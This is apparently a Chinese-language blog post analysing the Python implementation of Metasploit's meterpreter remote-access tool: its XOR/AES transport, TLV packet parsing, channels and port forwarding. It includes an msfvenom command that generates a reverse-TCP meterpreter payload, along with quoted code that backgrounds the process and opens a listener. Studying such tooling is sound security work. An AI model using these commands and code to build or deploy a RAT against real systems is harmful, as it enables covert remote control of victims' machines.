+++
title = "meterpreter 简要分析"
date = 2022-10-23
[taxonomies]
tags = ["python", "c2", "rat"]
+++
meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向/反向连接模式，并且功能强大，所以想分析下其实现。

- 2022-10-23 初版博文发布
- 2023-01-21 加入端口转发功能的实现分析

## 获取代码

meterpreter 的本体有很多种语言的实现，包括 C 实现的 [mettle](https://github.com/rapid7/mettle),还有在 [metasploit-payloads](https://github.com/rapid7/metasploit-payloads) 仓库里的 Python/PHP/Java 实现。这里选择 Python 实现。并且由于代码块中存在很多等待 Patch 的地方，所以这里直接用 msfvenom 生成一个。

```bash
msfvenom --payload python/meterpreter/reverse_tcp LHOST=192.168.92.1 LPORT=4444
```

## 简要分析

### 分析前准备

在代码中有开启日志的选项，并且还有去除启动时 `fork` 的选项，为了调试，把这两个选项修改成如下

```python
# these values will be patched, DO NOT CHANGE THEM
DEBUGGING = True
DEBUGGING_LOG_FILE_PATH = None
TRY_TO_FORK = False
```

接下来启动就可以看到相关的日志了。

```txt
~/d/t/meterpreter > python3 download.py                            
download.py:1713: DeprecationWarning: the imp module is deprecated in favour of importlib and slated for removal in Python 3.12; see the module's documentation for alternative uses
  import codecs,imp,base64,zlib
DEBUG:root:[*] running method core_negotiate_tlv_encryption
DEBUG:root:[*] Negotiating TLV encryption
DEBUG:root:[*] RSA key: 30820122300d06092a864886f70d01010105000382010f003082010a02820101009c3090c560a4e0b23b9b2141a48c6cbd42a67bde619931791e76b1a758761e061f2f50cfffe4c6eb47d2d15f07b2b0aed95c7c084d9d6b158e332126efbb4cebefc39979ca7a76fdba1291861e070b669f6febb795ada48b20e84356a6bb3daf7f74b179124ec87b08291e2a8e9f414a27b4e7dbbe3027a8d720cb46f6837f90747982c5b8cfa1ae8ee305203764b606f027da70a83f11a850cd6a4f4052eb85574c934ef5d50455b5cc822a23f0a9e6c44a305bf197216531ad6ac18adf1aa33042441a1fce964ed57da2ad6075d13787f4f9d17e69a35eb0a6fe10872e89eeb230bc0a15183618990933e786b952dd4783d299fd53e147421d442225f4d1470203010001
DEBUG:root:[*] AES key: 0x6ea0dd43076cdf8f560b094816af9fa8daa9bb8e15016f10370c69654970dd20
DEBUG:root:[*] Encrypted AES key: 0x676a4db54a6852f7c50566aceebd4c12f532ae763a9038e8c8c4a8f3f868f03cfd8b264aae861997dfa0eb4127edf2496ba252acfea0ad08f89e9e65ac196dea6b99b5af6982bfcbf77b9f59ef7bf8b59271ece5dc91209055ac9985361edbcd36fcedea212c0bf07adf36d319dfcc040b9a6869695c185a078466f8640f2581135c10ea8aeb2ec13053d5a89ab4b8388cf5df0b2e39671f885188469d5c776a9dded0277017e1bb693965d7eec66ade6df7597206544ad72a5c4ebc199275f40d02e5d270968e4a586946e35f51752a7d267d5e4df783a61fb6a21290f06d2879eec42d30de7e9550d54e73a11d42e42538131c90b7e7a60b6dc751884bb94e
DEBUG:root:[*] TLV encryption sorted
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_set_session_guid
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_enumextcmd
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_enumextcmd
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_loadlib
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_fs_getwd
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_sys_config_getuid
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_sys_config_sysinfo
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_set_uuid
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_net_config_get_interfaces
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_net_config_get_routes
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_channel_eof
DEBUG:root:[-] method core_channel_eof resulted in error: #1
DEBUG:root:[*] running method stdapi_fs_getwd
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_fs_stat
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_fs_ls
DEBUG:root:[*] sending response packet
```

### 协议部分

在接收数据时，程序主要是通过 `Transport` 类进行通信，并对通信数据的解密，得到的二进制数据通过 `packet_get_tlv` 函数进行解析。在返回数据时，则是通过 `tlv_pack` 函数将 TLV Packet 转换成二进制数据，并通过 `Transport` 类对数据进行加密通信。

#### Transport 类

程序会通过 `Transport` 类进行通信，这个类会对通信数据使用 xor/AES 进行混淆。而 `TcpTransport`/`HttpTransport` 通过多态，重载 `_send_packet` 和 `_get_packet` 方法，来实现在不同的底层协议下的通信。这个协议前 4 字节是 XOR 的密钥，然后后 4 字节是这个 Packet 的长度，通过 XOR 解密长度后，继续从 socket 中读取，就可以取得整个 Packet 的数据。

```python
class TcpTransport(Transport):
    # ...省略别的方法...

    def _get_packet(self):
        first = self._first_packet
        self._first_packet = False
        if not select.select([self.socket], [], [], 0.5)[0]:
            return bytes()
        packet = self.socket.recv(PACKET_HEADER_SIZE)
        if packet == '':  # remote is closed
            self.request_retire = True
            return None
        if len(packet) != PACKET_HEADER_SIZE:
            if first and len(packet) == 4:
                # 省略设置超时的代码
                pass
            return None

        xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
        # XOR the whole header first
        header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
        # Extract just the length
        pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0]
        pkt_length -= 8
        # Read the rest of the packet
        rest = bytes()
        while len(rest) < pkt_length:
            rest += self.socket.recv(pkt_length - len(rest))
        # return the whole packet, as it's decoded separately
        return packet + rest

    def _send_packet(self, packet):
        self.socket.send(packet)
```

上面重载的 2 个方法都是私有成员，所以在别的类中，调用 `get_packet` 才能获取 Packet 数据。在 `get_packet` 中，则是先调用 `_get_packet` 函数获得数据，然后调用 `decrypt_packet` 进行解密。

```python
class Transport(object):
    # ...

    def decrypt_packet(self, pkt):
        if pkt and len(pkt) > PACKET_HEADER_SIZE:
            xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
            raw = xor_bytes(xor_key, pkt)
            enc_offset = PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE
            enc_flag = struct.unpack('>I', raw[enc_offset:enc_offset+PACKET_ENCRYPT_FLAG_SIZE])[0]
            if enc_flag == ENC_AES256:
                iv = raw[PACKET_HEADER_SIZE:PACKET_HEADER_SIZE+16]
                encrypted = raw[PACKET_HEADER_SIZE+len(iv):]
                return met_aes_decrypt(self.aes_key, iv, encrypted)
            else:
                return raw[PACKET_HEADER_SIZE:]
        return None

    def get_packet(self):
        self.request_retire = False
        try:
            pkt = self.decrypt_packet(self._get_packet())
        except:
            debug_traceback()
            return None
        if pkt is None:
            return None
        self.communication_last = time.time()
        return pkt
```

#### TLV 协议

meterpreter 使用的是 TLV 协议进行通信，整个 Packet 由 3 部分组成，前 4 个字节是 Packet 长度，后 4 个字节是 Packet 类型，剩下的字节则是数据。下面是解析数据的代码。将原始 Packet 数据传递给 `packet_get_tlv` 函数，返回值是包含解析后数据的 dict。

```python
@export
def packet_enum_tlvs(pkt, tlv_type=None):
    offset = 0
    while offset < len(pkt):
        tlv = struct.unpack('>II', pkt[offset:offset + 8])
        if tlv_type is None or (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
            val = pkt[offset + 8:(offset + 8 + (tlv[0] - 8))]
            if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
                val = str(val.split(NULL_BYTE, 1)[0])
            elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
                val = struct.unpack('>I', val)[0]
            elif (tlv[1] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
                val = struct.unpack('>Q', val)[0]
            elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
                val = bool(struct.unpack('b', val)[0])
            elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
                pass
            yield {'type': tlv[1], 'length': tlv[0], 'value': val}
        offset += tlv[0]
    return

@export
def packet_get_tlv(pkt, tlv_type):
    try:
        tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
    except IndexError:
        return {}
    return tlv
```

需要注意的是类型(Type)字段则是由不同 meta-type 组成的，包括 `TLV_META_TYPE_STRING` `TLV_META_TYPE_UINT` 等类型。而在程序通信时真正会用到的类型，则是由 meta-type 和 identifier 组成。这样做的目的是可以让程序对类型进行校验。可以看到下面的代码中，`TLV_TYPE_CHANNEL_ID` 是由 `TLV_META_TYPE_UINT` 和标识 50 组成的。

```python
# ...
TLV_META_TYPE_UINT       = (1 << 17)
# ...
TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
```

### 开始部分

下面是代码最先运行的部分，可以看到是进行了 `fork`，并 `setsid` 让程序运行在后台，然后就是使用 socket 监听 4444 端口。收到连接时，使用 `TcpTransport` 建立一个 `Transport` 之后进入 `PythonMeterpreter` 进行主要交互逻辑。

```python
_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
if not _try_to_fork or (_try_to_fork and os.fork() == 0):
    if hasattr(os, 'setsid'):
        try:
            os.setsid()
        except OSError:
            pass
    # ...
    bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bind_sock.bind(('0.0.0.0', 4444))
    bind_sock.listen(1)
    s, address = bind_sock.accept()
    transport = TcpTransport.from_socket(s)
    met = PythonMeterpreter(transport)
    # PATCH-SETUP-TRANSPORTS #
    met.run()
```

### PythonMeterpreter

这个类是真正负责逻辑交互的类。主要循环在 `run` 函数中，函数主要是获取 TLV Packet 数据，然后在 `create_response` 函数中解析数据，调用相关的处理函数，获得返回值，最后发送回复。然后是遍历 channel 读取和发送数据，从 channel 中读取数据后，发送给控制端。channel 的设计在后文中会讲解。

```python
class PythonMeterpreter(object):
    def run(self):
        while self.running and not self.session_has_expired:
            request = self.get_packet()
            if request:
                response = self.create_response(request)
                if response:
                    self.send_packet(response)
            # iterate over the keys because self.channels could be modified if one is closed
            channel_ids = list(self.channels.keys())
            for channel_id in channel_ids:
                channel = self.channels[channel_id]
                data = bytes()
                write_request_parts = []
                if isinstance(channel, MeterpreterProcess):
                    # ...
                    pass
                # ...
                if data:
                    write_request_parts.extend([
                        {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
                        {'type': TLV_TYPE_CHANNEL_DATA, 'value': data},
                        {'type': TLV_TYPE_LENGTH, 'value': len(data)},
                    ])
                    self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))
```

### MeterpreterChannel

Channel 是 meterpreter 运行程序，开启端口转发等功能时，进行交互的“通道”，这样的设计可以让其同时运行不同的功能，而不阻塞和用户之间的交互。在下面的代码中可以看到，Channel 和 meterpreter 之间的读写，也是通过 TLV 协议进行交互的。

不同功能的 Channel 通过重载 `MeterpreterChannel` 的 `read` 和 `write` 等方法，实现不同的交互。

```python
class MeterpreterChannel(object):
    # ...

    def core_read(self, request, response):
        length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
        response += tlv_pack(TLV_TYPE_CHANNEL_DATA, self.read(length))
        return ERROR_SUCCESS, response

    def core_write(self, request, response):
        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
        response += tlv_pack(TLV_TYPE_LENGTH, self.write(channel_data))
        return ERROR_SUCCESS, response

class MeterpreterSocket(MeterpreterChannel):
    # ...

    def read(self, length):
        return self.sock.recv(length)

    def write(self, data):
        return self.sock.send(data)
```

### core 和 stdapi

core 是 meterpreter 的基础功能，包括 channel 和 transport 的管理等功能。这些功能的实现是在 `PythonMeterpreter` 类中以 "_core" 开头的函数，在类初始化时加入到 `extension_functions` dict 中供后续调用。而 stdapi 则是平时用到的扩展功能，包括上传/下载文件等功能，通过 `core_loadlib` 功能进行动态载入。

## 功能分析

### 端口转发

开启端口转发后，访问端口可以看到下面的日志，配合日志可以对代码进行分析。

```txt
DEBUG:root:[*] running method core_channel_open
DEBUG:root:[*] core_channel_open dispatching to handler: channel_open_stdapi_net_tcp_client
DEBUG:root:[*] added channel id: 2 type: MeterpreterSocketTCPClient
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method core_channel_write
DEBUG:root:[*] sending response packet
DEBUG:root:[*] running method stdapi_net_socket_tcp_shutdown
DEBUG:root:[*] sending response packet
```

可以看出先通过 `channel_open_stdapi_net_tcp_client` 函数创建链接。主要流程就是从请求中获取 socket 连接信息 `peer_address_info`，还有可选的 `local_address_info`，然后尝试去连接，如果连接成功的话，就创建新的 `MeterpreterSocketTCPClient` 类型的 channel，在创建成功后返回给控制端相应的信息。

```python
@register_function
def channel_open_stdapi_net_tcp_client(request, response):
    peer_address_info, local_address_info = getaddrinfo_from_request(request, socktype=socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)
    retries = packet_get_tlv(request, TLV_TYPE_CONNECT_RETRIES).get('value', 1)
    if not peer_address_info:
        return ERROR_CONNECTION_ERROR, response
    connected = False
    for _ in range(retries + 1):
        sock = socket.socket(peer_address_info['family'], peer_address_info['socktype'], peer_address_info['proto'])
        sock.settimeout(3.0)
        # ...
        try:
            sock.connect(peer_address_info['sockaddr'])
            connected = True
            break
        except:
            pass
    if not connected:
        return ERROR_CONNECTION_ERROR, response
    channel_id = meterpreter.add_channel(MeterpreterSocketTCPClient(sock))
    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
    response += tlv_pack_local_addrinfo(sock)
    return ERROR_SUCCESS, response
```

在相应的 channel 创建成功后，下一条指令就是 "core_channel_write"，往之前创建的 socket 对应的 channel 里写入数据后，主循环会遍历 channel 列表，如果 channel 是 `MeterpreterSocketTCPClient` 就尝试从中读取数据并返回。需要注意的是在收发数据的时候对 fd 使用了 `select` 函数等待读事件，并设置了超时时间，防止单个 channel 长时间阻塞主进程。

```python
def run(self):
    while self.running and not self.session_has_expired:
        request = self.get_packet()
        if request:
            response = self.create_response(request)
            if response:
                self.send_packet(response)
            # ...
        # iterate over the keys because self.channels could be modified if one is closed
        channel_ids = list(self.channels.keys())
        for channel_id in channel_ids:
            channel = self.channels[channel_id]
            data = bytes()
            write_request_parts = []
            if isinstance(channel, MeterpreterSocketTCPClient):
                while select.select([channel.fileno()], [], [], 0)[0]:
                    try:
                        d = channel.read(1)
                    except socket.error:
                        d = bytes()
                    if len(d) == 0:
                        self.handle_dead_resource_channel(channel_id)
                        break
                    data += d
            # ...
            if data:
                write_request_parts.extend([
                    {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
                    {'type': TLV_TYPE_CHANNEL_DATA, 'value': data},
                    {'type': TLV_TYPE_LENGTH, 'value': len(data)},
                ])
                self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))
```

## 总结

这里只是简单的过了一遍 meterpreter Python 实现的主体代码。加密密钥的传输，stdapi 的添加等细节则是没有提到，等后面有空了可能就会写了(

## Refs

- [Using Metasploit Advanced Meterpreter Overview](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html)
- [original specification](http://www.hick.org/code/skape/papers/meterpreter.pdf)
